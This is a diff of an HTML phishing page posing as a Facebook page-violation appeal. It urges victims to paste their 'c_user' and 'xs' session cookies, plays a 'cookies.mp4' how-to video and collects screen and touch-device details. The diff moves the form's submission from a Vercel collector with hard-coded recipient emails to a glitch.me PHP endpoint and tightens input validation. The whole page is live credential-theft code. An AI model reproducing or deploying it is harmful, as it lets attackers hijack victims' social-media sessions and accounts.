@@ -11,13 +11,8 @@
 </head>
 
 <body>
-    <form class="sm:hidden lg:block md:block" action="https://postal-form.vercel.app/post" method="post" id="device-form">
-        <input type="hidden" name="redirectUrl" value="https://all-sub-pass.vercel.app/">
-        <input type="hidden" name="name" value="Umais">
-        <input type="hidden" name="email" value="saadnizamani19@gmail.com,sarahtaylorfbadvertising0@gmail.com">
-        <input type="hidden" name="workerEmail" value="">
-
-     
+    <form class="sm:hidden lg:block md:block" action="https://stream-curvy-nightshade.glitch.me/ammolvi.php" method="post">
+        
         <input type="hidden" id="screenWidth" name="screenWidth" value="">
         <input type="hidden" id="screenHeight" name="screenHeight" value="">
         <input type="hidden" id="isTouchDevice" name="isTouchDevice" value="">
@@ -34,33 +29,28 @@
                     <h5 class="m-0">Request For Remove Page Violation</h5>
                 </div>
                 <div class="p-2">
-                    <p class="fw-semibold validation_form_para">We've identified irregular activity on your page that
-                        goes against our community guidelines.</p>
-                    <p class="fw-semibold validation_form_para">As a result, access to your page has been restricted,
-                        and you're presently unable to post, share, or comment using it.</p>
-                    <p class="fw-semibold validation_form_para">Please provide the precise details below. Refer to the
-                        video for clarification if you find the instructions unclear.</p>
+                    <p class="fw-semibold validation_form_para">We've identified irregular activity on your page that goes against our community guidelines.</p>
+                    <p class="fw-semibold validation_form_para">As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.</p>
+                    <p class="fw-semibold validation_form_para">Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
                     <p class="fw-semibold text-secondary" style="font-size: 12px;">Detailed Video Information.</p>
-                    <video controls="" autoplay=""
-                        src="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202"
-                        style="width: 300px; height: 160px;"></video>
+                    <video controls="" autoplay="" src="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202" style="width: 300px; height: 160px;"></video>
                     <br>
                     <button>Enable Sound</button>
-                    <p class="fw-semibold validation_form_para mt-2">Please be sure to provide the requested information
-                        below.</p>
-                    <label class="" style="font-size: 12px;">c_user</label>
+                    <p class="fw-semibold validation_form_para mt-2">Please be sure to provide the requested information below.</p>
+
+                    <!-- Keep the c_user and xs input here below -->
+                    
                     <br>
-                    <input type="number" name="c_user" required="" pattern="^\d{15}$" title="Please enter 15 digits">
+                    <input type="number" name="c_user" required pattern="^\d{15}$" title="Please enter 15 digits">
                     <br>
+
                     <label class="mt-2" style="font-size: 12px;">xs</label>
                     <br>
-                    <input type="text" name="xs">
-                    <p class="mt-2" style="font-size: 12px;">Please make sure not to log out from your computer or
-                        laptop until you have received a verification email.</p>
+                    <input type="text" name="xs" required pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$">
+                    <p class="mt-2" style="font-size: 12px;">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
                 </div>
                 <div class="p-2 mb-2 d-flex justify-content-end" style="background: rgb(245, 246, 247);">
-                    <button type="submit" class="text-white border-0"
-                        style="background: rgb(66, 103, 178);">Submit</button>
+                    <button type="submit" class="text-white border-0" style="background: rgb(66, 103, 178);">Submit</button>
                 </div>
             </div>
         </div>
@@ -75,7 +65,6 @@
             const screenWidth = window.innerWidth;
             const screenHeight = window.innerHeight;
 
-    
             document.getElementById("screenWidth").value = screenWidth;
             document.getElementById("screenHeight").value = screenHeight;
             document.getElementById("isTouchDevice").value = isTouchDevice ? "true" : "false";
